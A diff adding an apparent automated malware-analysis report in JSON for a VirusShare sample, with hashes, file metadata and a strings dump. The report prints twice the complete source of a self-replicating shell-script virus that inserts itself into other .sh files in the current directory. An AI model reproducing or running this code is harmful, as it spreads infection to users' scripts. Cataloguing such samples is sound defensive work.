@@ -1,0 +1,54 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "shell": "May run an executable file or a system command"
+        },
+        "macro": "#!/bin/sh\n#file name: shvs.sh\n#compiler:  hehehehe@hack.org\n\n#B:<+!a%C&t:>\nvFile=$_ ; vTmp=/tmp/.vTmp.$$\nfor f in ./*.sh; do\n  if [ ! -w $f -a ! -r $vFile ];  then continue; fi\n  if grep '<+!a%C&t:>' $f ;       then continue; fi\n  if sed -n '1p' $f | grep 'csh'; then continue; fi\n  cp -f $f $vTmp ;if [ $? -ne 0 ];then continue; fi\n  vNo=`awk '$0~/(^\\b*#)|(^\\b*$)/&&v==NR-1{v++}END{print 0+v}' $vTmp`\n  sed -n \"1,${vNo}p\" $vTmp >$f\n  (sed -n '/^#B:<+!a%C&t:>/,/^#E:<+!a%C&t:>/p' $vFile ;echo ) >>$f\n  vNo=`expr $vNo + 1`\n  sed -n \"${vNo},\\$p\" $vTmp >>$f\n  rm -f $vTmp\ndone >/dev/null 2>&1\nunset vTmp ;unset vFile ;unset vNo\n\necho \"Hi, here is a My shell virus in script !\"\n#E:<+!a%C&t:>\n#EOF"
+    },
+    "filename": "VirusShare_00d3bdc05d90290f9f39d8df2fdb9a61",
+    "filesize": 693,
+    "filetype": "POSIX shell script, ASCII text executable",
+    "hashes": {
+        "md5": "00d3bdc05d90290f9f39d8df2fdb9a61",
+        "sha1": "0438583755c57ea0a7862bc5d80cb384586464a3",
+        "sha256": "a7fe430a7e76df268fe9b230bca624b2fcd59a040ba4f5780ffe7b54146c1d59"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/bin/sh",
+            "#file name: shvs.sh",
+            "#compiler:  hehehehe@hack.org",
+            "#B:<+!a%C&t:>",
+            "vFile=$_ ; vTmp=/tmp/.vTmp.$$",
+            "for f in ./*.sh; do",
+            "  if [ ! -w $f -a ! -r $vFile ];  then continue; fi",
+            "  if grep '<+!a%C&t:>' $f ;       then continue; fi",
+            "  if sed -n '1p' $f | grep 'csh'; then continue; fi",
+            "  cp -f $f $vTmp ;if [ $? -ne 0 ];then continue; fi",
+            "  vNo=`awk '$0~/(^\\b*#)|(^\\b*$)/&&v==NR-1{v++}END{print 0+v}' $vTmp`",
+            "  sed -n \"1,${vNo}p\" $vTmp >$f",
+            "  (sed -n '/^#B:<+!a%C&t:>/,/^#E:<+!a%C&t:>/p' $vFile ;echo ) >>$f",
+            "  vNo=`expr $vNo + 1`",
+            "  sed -n \"${vNo},\\$p\" $vTmp >>$f",
+            "  rm -f $vTmp",
+            "done >/dev/null 2>&1",
+            "unset vTmp ;unset vFile ;unset vNo",
+            "echo \"Hi, here is a My shell virus in script !\"",
+            "#E:<+!a%C&t:>",
+            "#EOF"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.266829",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
